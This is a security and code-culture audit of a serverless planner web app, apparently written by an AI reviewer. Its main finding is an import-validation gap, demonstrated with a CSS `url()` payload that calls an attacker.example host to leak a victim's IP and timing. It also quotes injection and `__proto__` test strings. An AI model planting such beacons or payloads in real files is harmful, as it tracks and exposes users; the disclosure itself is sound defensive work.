# Security and culture audit

Scope: the working tree at the audited commit on `main`, the full git history (184 commits, 21 of
them merges), and the deployed GitHub Pages build. This is a review, not a change - nothing outside
this file was modified to produce it. Severities are Critical / Important / Minor. "Critical" is
reserved for something an attacker could use today to run code, steal data, or take over the app or
account; nothing found here reaches that bar.

**Note on scope:** partway through this review, the working tree changed under it - `src/App.tsx`,
`src/pwa.ts`, `src/pwa.test.ts`, and `src/styles.css` picked up uncommitted edits, and two new
untracked files appeared (`src/UpdateNotice.tsx`, `src/UpdateNotice.test.tsx`), from some process
other than this audit (nothing beyond this report was written by the audit itself). That work is a
self-contained, in-progress feature - deferring the service worker's "a new build just took over"
handling from an automatic reload to a dismissible "Reload" notice the person clicks themselves - and
appears consistent with the rest of the codebase's quality (accessible `role="status"`, reload only
ever fires from an explicit click, no new data-handling surface). It is uncommitted and was not part
of what this audit otherwise reviewed line-by-line; re-run this audit's `Part 1`/`Part 2` checks
against it once it lands rather than trusting this note as a substitute.

## Part 1 - Security

### Where this app can actually be attacked

There is no server and no account, so most of the usual web threat model does not apply: nothing to
authenticate, nothing to authorize, no session to hijack, no server-side data to steal. What is left
is narrower but real: five places untrusted text enters the app (quick add, the template editor, the
if-then editor, the theme override panel, and import), one shared place all of that data eventually
lives (`localStorage`, one JSON blob under `dienius:data`), and one place a person can hand another
person a file that goes straight into that blob without ever touching the app's own input forms:
**import**. The review below focuses there, as the brief asked, and treats the four UI-level inputs
as a secondary check, since the UI itself constrains three of the four (see below).

**Bottom line up front: no critical findings.** One Important finding - a real, verified issue with a
bounded impact - and a handful of Minor ones. `npm audit` is clean. No secrets anywhere in the working
tree or across the full git history. No path to script execution or data theft was found or could be
constructed.

### Finding 1 (Important) - unvalidated color strings let an imported backup plant a network beacon

**Where:** `src/lib/storage.ts` - `isTemplate` (line 140, `typeof x.color === 'string'`),
`isIfThenEntry` (lines 205-216, `isOptionalString(x.color)`), and `isThemeOverrides` (lines 162-164,
`Object.values(x).every(v => typeof v === 'string')`). None of these check that the string is
actually a color.

**Where it lands:** these strings are later used, unsanitized, as literal CSS values -
`src/styles.css:113-117` (`background: <gradients>, var(--bg);`), `src/lib/theme.ts:163-171`
(`root.style.setProperty(...)` for every theme token), and every place a template or if-then color
paints a swatch: `src/views/TemplatesView.tsx:144,361`, `src/views/CalendarView.tsx:201,252`,
`src/widgets/day-plan/DayView.tsx:241`, `src/widgets/year-strip/YearStrip.tsx:207`,
`src/widgets/if-then/IfThenBoard.tsx:115,268,316`.

**What I actually tried, not just reasoned about.** The brief asked to try breaking this, so I did,
against a live browser rather than by inspecting the spec alone:

- *Semicolon/quote breakout* (`red; background: url(javascript:...)`, `red; outline: 999px solid
  lime`): **does not work.** I set this both through the JS style API the way React applies an inline
  `style` object, and through `CSSStyleDeclaration.setProperty` the way `theme.ts` applies theme
  tokens. In both cases the browser rejected the value outright - nothing was set, not even the
  `background` itself, let alone a second declaration. Neither of the two code paths this app actually
  uses ever re-parses a combined `"property: value;"` text string the way a naive string-templated
  `style` attribute would, so there is no CSS-injection breakout here. `javascript:` URLs inside
  `url()` are also a dead vector in every modern browser regardless.
- *A `url()` value as the color itself* (`url("https://attacker.example/x.png")`): **this works.** I
  reproduced it twice against a live page: once mimicking the app's own
  `background: <gradients...>, var(--bg);` pattern (setting `--bg` to a `url()` value), once mimicking
  the `style={{ background: t.color }}` pattern the template/if-then swatches use directly. Both fired
  a real, observable network request for the crafted URL (confirmed via `PerformanceObserver`, not
  just the absence of an error).

**What an attacker could actually do with this.** Hand the user a backup file - "here, try my
templates" / "here's my if-then setup" - with a template color, an if-then tag color, or a theme
override value set to `url("https://attacker.example/beacon.png?id=<per-victim-token>")` instead of a
real hex color. `validate()` accepts it, since it never checks the string looks like a color. The
moment the user imports it and then opens Templates, Calendar, the day view, the year strip, or has
that preset active at all (theme applies immediately on any data change, per the `useEffect` in
`src/App.tsx:26-46`), their browser makes an outbound request to that URL. That confirms to the
attacker the file was opened, and leaks the victim's IP address, user agent, and timing to a server
the attacker controls, with a token unique to that one shared file if the attacker bothers to embed
one. It cannot execute script, read `localStorage`, or exfiltrate the user's actual planner content -
the leak is strictly "this URL was requested, from this IP, at this time." That is a real,
non-theoretical privacy leak reachable through the single most-trusted input path (import), which is
why this is Important rather than Minor, but it is bounded well short of code execution or data theft.

**Fix, and its cost:** add a strict format check (e.g. `/^#[0-9a-fA-F]{3,8}$/`, matching the hex
values the app's own UI already exclusively produces) to the validators for `Template.color`,
`IfThenEntry.color`, and each value inside a `ThemeOverrides` patch, in `validate()`. This is a small,
localized change - every legitimate value the app itself ever writes already matches that pattern, so
nothing real would be rejected.

### Finding 2 (Minor) - no size or shape caps on import

**Where:** `src/lib/storage.ts`, `validate()` (lines 239-246) and every `is*` helper under it.

There is no limit on array length, object key count, string length, or nesting depth anywhere in
validation. A backup with several hundred thousand tasks, or a single absurdly long string, parses
and validates fine; `validate()`'s `.every()` calls walk all of it synchronously, and the app then
tries to render it. The practical ceiling is a temporary UI freeze, worst case a tab crash - never
another party's data, since this only ever affects the tab that opened the file. It also does not fail
silently: if the resulting state is too large to fit in `localStorage`, `saveData()` catches the
`QuotaExceededError` and returns `false`, and `SettingsView.tsx:64-66` already shows "Saving to this
browser failed... export a backup" - a real, honest degradation path, not a silent data loss. Worth a
sanity cap on import (a few MB, or a few thousand entries) as cheap insurance against a confusing
freeze, but this is polish, not a hole.

### Finding 3 (Minor) - no Content-Security-Policy on the deployed page

GitHub Pages serves no CSP by default, and there is no `<meta http-equiv="Content-Security-Policy">`
in `index.html`. Concretely, for this app: I found no `dangerouslySetInnerHTML`, no `eval`, no
`Function` constructor, and no server to call out to anywhere in shipped code (confirmed by a
repo-wide search, not just spot checks), so a CSP would mostly be defense-in-depth here rather than
closing a hole that is open today. It would, however, have caught Finding 1 above for free - a policy
with a tight `img-src`/`connect-src` blocks exactly that kind of outbound beacon - and it is cheap
insurance against a future regression.

Adding one costs more than a one-liner here, specifically because of two things this app does on
purpose: the pre-paint script in `index.html` is inline (needs either `'unsafe-inline'` in
`script-src`, which defeats much of the point, or a SHA-256 hash source that has to be updated by hand
every time that script's text changes - there is no server to mint a per-request nonce), and
`syncManifestTheme` (`src/lib/manifest-sync.ts`) swaps the manifest `<link>` to a `blob:` URL at
runtime, which needs `manifest-src blob:` or the live-color install flow silently breaks. Both are
solvable, but it is a real, ongoing maintenance item once added, not a drop-in fix - worth doing before
this app grows more surface area, not urgent today.

### Finding 4 - secrets and git history: clean

`git log -p` across the entire history (184 commits, every branch) turned up no API keys, tokens,
passwords, or private paths. The only email address anywhere in the history is the author's own commit
metadata (`author email`, `Quicasha`) - no other person's address, no leaked contact info. No
`.env`, key, or credential file was ever added and later removed (checked via
`git log --diff-filter=A --name-only`). Nothing in the working tree either. This is worth stating
plainly rather than padding the report with a "theoretical" secrets finding: there is nothing here.

### Finding 5 - `npm audit`: clean, and why that is credible here

`npm audit` reports zero vulnerabilities at any severity, across all 160 resolved packages (4
production - `react`, `react-dom`, and their peers - the rest devDependencies for build and test
tooling). This is a small, honest dependency surface rather than a large one that happens to have no
open CVEs today: two production dependencies total, both from React itself, nothing else touches the
shipped bundle. There is very little here for a supply-chain issue to hide in.

### Finding 6 - prototype pollution: checked deliberately, and genuinely clean

The brief flagged that `index.html`'s pre-paint script had exactly this class of bug once. I confirmed
it is fixed, and checked the rest of the codebase for the same pattern rather than taking the comment's
word for it:

- The pre-paint script's preset lookup (`index.html`) is a flat array searched linearly
  (`findPresetById`), not an object keyed by an attacker-controlled preset id - immune by construction
  to an `Object.prototype` collision. Every other bracket-keyed lookup in that script is guarded with
  `Object.prototype.hasOwnProperty.call`. `src/preTheme.test.ts:184` runs a dedicated regression test
  against `['constructor', 'toString', 'valueOf', 'hasOwnProperty', '__proto__']` as colliding preset
  ids, so this cannot silently regress.
- I traced the two remaining places a string from a crafted backup reaches a bracket-keyed object
  lookup - `state.overrides[preset.id]` in `src/lib/theme.ts:119` and
  `data.settings.theme.overrides[presetId]` in `src/lib/store.ts:297,321` - and confirmed neither is
  reachable: the first keys off `preset.id`, which only ever comes from `findPreset`'s own hardcoded
  literal ids, never from attacker input; the second only ever *creates new objects* through object
  spread with a computed key (`{ ...obj, [presetId]: value }`), which - unlike the literal
  `{ __proto__: value }` shorthand - does not trigger the exotic prototype-setting behavior in object
  literals. I confirmed this distinction is real, not assumed: `{...obj, [key]: value}` with
  `key = '__proto__'` produces a plain object with an own property literally named `"__proto__"`,
  never a mutation of `Object.prototype` itself.
- `JSON.parse` itself is also not a vector here: parsing `{"__proto__": {...}}` produces an object
  with a normal own property named `"__proto__"`, not a walk up the prototype chain - this is standard
  engine behavior, not something this codebase has to defend against separately, and nothing in this
  app's own code does a naive recursive merge (`for (k in obj) target[k] = obj[k]`) that would be
  vulnerable even if it were.

### Finding 7 - the service worker: correctly scoped

`public/sw.js` (filled in by `scripts/generate-sw.mjs` at build time) only ever handles same-origin,
GET requests (`url.origin !== self.location.origin` falls through to the network untouched), and
explicitly skips ranged requests with a comment explaining exactly why (a cached whole response
answering a ranged request would hand back more than was asked for - a documented, deliberate guard
against a known service-worker pitfall, not something currently exercised since the app has no
audio/video). It precaches exactly the files the current build produced, under a cache name derived
from a SHA-1 hash of the build output, so a stale cache cannot survive a new deploy and an old worker
cannot go on serving yesterday's files. I found nothing it could be tricked into caching or serving
that it should not.

### Finding 8 - the manifest blob-URL swap: not an injection surface

`syncManifestTheme` (`src/lib/manifest-sync.ts:59-68`) only ever feeds the resolved theme's own
background token into `JSON.stringify(manifest)` before building the blob - it is not reachable as
anything other than a properly escaped JSON string value, regardless of what a crafted backup's theme
tokens contain. No injection surface here.

### Security summary

| # | Finding | Severity |
|---|---|---|
| 1 | Unvalidated color strings from import can plant a network beacon (verified live) | Important |
| 2 | No size/shape caps on import | Minor |
| 3 | No CSP on the deployed page | Minor |
| 4 | Secrets / git history | Clean |
| 5 | `npm audit` | Clean |
| 6 | Prototype pollution | Clean (one historical instance, fixed and tested) |
| 7 | Service worker scope | Clean |
| 8 | Manifest blob-URL swap | Clean |

No critical findings. Nothing here amounts to code execution, account compromise (there are no
accounts), or theft of the user's actual planner data.

---

## Part 2 - Engineering culture

### What is genuinely good, stated plainly rather than buried under nitpicks

- **`dangerouslySetInnerHTML`, `eval`, `Function`, `any`, `@ts-ignore`, `@ts-expect-error`: zero
  occurrences** in shipped code, confirmed by a repo-wide search, not a sample. `tsconfig.json` runs
  `strict`, `noUnusedLocals`, and `noUnusedParameters`.
- **`console.*`: exactly one call in the entire `src` tree** - `console.error` inside
  `ErrorBoundary.tsx:26`'s `componentDidCatch`, which is precisely where a console log belongs. The
  one `console.log` that exists in the repo at all (`vite.config.ts:28`) runs inside the Node build
  script at `closeBundle` time and never ships to the browser - not a production-path log.
  `TODO`/`FIXME`/`XXX`/`HACK`: zero occurrences. `.only(` in tests: zero occurrences.
  `it.skip`/`test.skip`/`.todo`: zero occurrences.
- **Every `catch` block is deliberate.** I read all eleven of them. Each either does something
  concrete (falls back to a default, surfaces a UI message, returns a safe value) or has an explicit
  one-line comment explaining why swallowing is correct there (private browsing may disable storage;
  losing an in-progress draft is no worse than not having one). None hide a real failure silently with
  no explanation - the one exception is a style nit, not a hidden bug (see Finding 4 below).
- **Dependencies are minimal and every one is justified.** Two production dependencies total (`react`,
  `react-dom`); nine devDependencies, every one directly explainable as test or build tooling
  (`vitest`, `jsdom`, `@testing-library/*`, `@vitejs/plugin-react`, `typescript`, `vite`,
  `@types/node`). No state-management library, no UI kit, no date library, no lodash - `crypto.randomUUID`
  and a hand-rolled `useSyncExternalStore` store cover what those would normally be reached for. I
  found nothing to drop.
- **`src/lib` is close to actually pure.** Only four files touch a browser global at all, and each has
  a stated reason: `storage.ts` (its whole job is `localStorage`), `theme.ts` (applies resolved tokens
  to the DOM - the file's own header comment explicitly separates the pure `resolveTheme` half from
  the DOM-touching half), `theme-color.ts` and `manifest-sync.ts` (sync a `<meta>`/`<link>` tag,
  documented as such). `store.ts` imports React only for `useSyncExternalStore` - the correct, intended
  primitive for bridging a plain external store into React, not a boundary violation. No view reaches
  into `localStorage` directly; every read/write goes through `storage.ts` and `store.ts`.
- **Tests: 781 passing, 0 skipped, 0 assertion-free.** I checked every test file for an `expect` count
  at least equal to its test count (none came up short) and searched for snapshot tests (none exist).
  This is a suite that asserts real behavior through `@testing-library`'s user-facing queries in the
  view tests, and pure-function unit tests for the algorithmic modules - not implementation-detail
  assertions.
- **~3,200 lines of design-decision documentation** (`docs/DECISIONS.md`, `docs/THEMES.md`,
  `docs/TIMELINE.md`, two ADHD/UX research docs) explaining the reasoning, and the cost, behind
  nontrivial calls - why a two-push bound and not three, why there is no streak, why `dayType` stays
  coarse. This is well beyond what a portfolio repo needs to do and it shows real engineering
  judgment, not just code that happens to work.

### Findings

**Finding 1 (Minor) - a comment overstates code sharing that does not actually happen.**
`src/widgets/day-plan/capacity.ts:122`, `gapsInWindow`, is exported and documented as "Exported for the
grid's own gap computation - see the note on `clipToWindow` above" - but `computeInteriorGaps` in
`src/widgets/day-plan/timelineLayout.ts:312-329` reimplements gap-finding by hand rather than calling
it (the two are not actually interchangeable - one includes the window's edge gaps, the other only
interior ones - so the code itself is correct, just not shared the way the comment implies).
`gapsInWindow` is called nowhere outside its own file. Given how much this codebase leans on "the
comment is the promise, the test is what keeps it honest" (the same phrase appears almost verbatim in
`index.html`'s pre-paint script comment), a comment that claims sharing which is not actually
enforced by any test is the kind of thing that is worth either tightening the comment or actually
sharing the code - not a functional bug, a documentation-accuracy nit in a codebase that otherwise
holds itself to a much higher bar for its own comments.

**Finding 2 (Minor) - a few exports nothing outside their own file uses.**
`gapsInWindow` (above), plus a handful of component `Props` interfaces
(`TaskRowProps`, `GapPickerProps`, `IfThenSheetProps`, `LongPressOptions`, `LongPressHandlers`,
`StarterOffersProps`, `TimelineGridProps`, `WidgetDef`, `MonthLabel`, and a few more) and two small
value exports (`pushCountLabel` in `TaskRow.tsx`, `TEMPLATE_COLORS` in `TemplatesView.tsx:12`) are
exported but only ever referenced inside their own file. This is effectively free - types are erased
at build time, and the two value cases are just an unnecessary `export` keyword - so it costs nothing
to leave alone, and I would not spend a PR on it. Noted only because the brief specifically asked for
unused exports.

**Finding 3 (Minor) - one real `act()` warning surfaced by actually running the suite.**
Running the full test suite (`npx vitest run`) passes 781/781, but
`src/widgets/year-strip/YearStrip.test.tsx > "arrow keys do not cross into a year that is not
rendered"` prints "An update to YearStrip inside a test was not wrapped in act(...)." The test still
passes and is asserting real, user-facing behavior (not the implementation), but the warning means the
assertion is potentially being made a tick early relative to when React actually commits the state
update - worth wrapping the key-event dispatch in `act()`, a five-minute fix, not urgent.

**Finding 4 (Minor) - one stylistic outlier against the codebase's own comment convention.**
`src/widgets/day-plan/draft.ts:65-67` has `catch { // ignore }`, inside a file where every other catch
- including two others in the same file - explains in a full sentence why swallowing the error is the
right call. Not a bug; just the one place in an otherwise very deliberately-commented codebase that
reads like it was left in a hurry.

**Finding 5 (Minor) - CI only runs on push to `main`, not on the pull requests this repo actually uses.**
`.github/workflows/deploy.yml:3-5` triggers only on `push: branches: [main]`. The repo's own history
has 21 merge commits, meaning branches and PRs are a real part of how this gets built, not just a
single person always committing straight to `main` - so there is currently no automated signal (tests,
build) on a branch or PR before it merges, only after. Low-stakes for a solo repo, but worth either a
line in `docs/DECISIONS.md` if the trunk-only trigger is deliberate (e.g. "CI cost isn't worth doubling
for a solo repo"), or a small `pull_request: branches: [main]` addition to the workflow if not - it is
a two-line change to run the same `npm test -- --run` job on a PR.

**Finding 6 (Minor) - one doc figure has drifted from reality.**
`README.md:95` says "750 tests"; the suite currently has 781 (the audit brief itself says 774, which
is itself already stale relative to `main`). Harmless, but a number stated as a fact in the README that
changes with nearly every feature commit is going to keep drifting - either drop the exact count from
the README in favor of "the pure modules directly and the views through user-facing interaction" (which
the same sentence already says and does not date), or accept it will need touching up periodically.

### Configuration review

- **`tsconfig.json`**: strict, `noUnusedLocals`/`noUnusedParameters` on, `skipLibCheck` on (reasonable
  for an app with only two runtime dependencies), includes `scripts` so the Node-side build script is
  typechecked too. Nothing sloppy here.
- **`vite.config.ts`**: small and legible; the service-worker-generation plugin is well-commented about
  exactly when it runs and why (`closeBundle`, after Vite has copied `public/` so the generated
  precache list can see files Vite itself never touches). `base` is defined once and threaded through
  rather than duplicated.
- **`.github/workflows/deploy.yml`**: correctly gates deploy behind build succeeding, and build behind
  tests succeeding (`npm test -- --run` before `npm run build`), uses pinned major-version actions, and
  scopes `permissions` to exactly what deploying to Pages needs. Its one gap is Finding 5 above.
- **`.gitignore`**: covers `node_modules`, `dist`, `*.local`, `.DS_Store` - correctly excludes the
  build output (confirmed `dist/` is untracked and shows as ignored, not just absent) and nothing
  sensitive is missing from it, since nothing sensitive exists in the tree to begin with.

### Culture summary

| # | Finding | Severity |
|---|---|---|
| 1 | Comment overstates gap-computation code sharing (`capacity.ts` / `timelineLayout.ts`) | Minor |
| 2 | A few exports (mostly `Props` types) unused outside their own file | Minor |
| 3 | One `act()` warning in `YearStrip.test.tsx` | Minor |
| 4 | One terse `catch { // ignore }` against the file's own convention | Minor |
| 5 | CI does not run on pull requests, only on push to `main` | Minor |
| 6 | README's test count has drifted from the actual suite size | Minor |

No Critical or Important culture findings. Everything found here is the kind of thing a careful
reviewer would leave as an inline PR comment, not a reason to hesitate about the codebase as a whole.

---

## Overall verdict

This is a small, carefully built app with an unusually disciplined engineering culture for its size -
strict typing with zero escape hatches, a genuinely minimal and justified dependency list, deliberate
error handling throughout, a real test suite that asserts behavior rather than implementation, and
documentation of *why*, not just *what*, that goes well beyond what the code alone would need. The one
security issue worth fixing (Finding 1, Part 1) is real and reachable but bounded - a beacon, not a
breach - and it has a small, precise fix. Everything else here is polish.
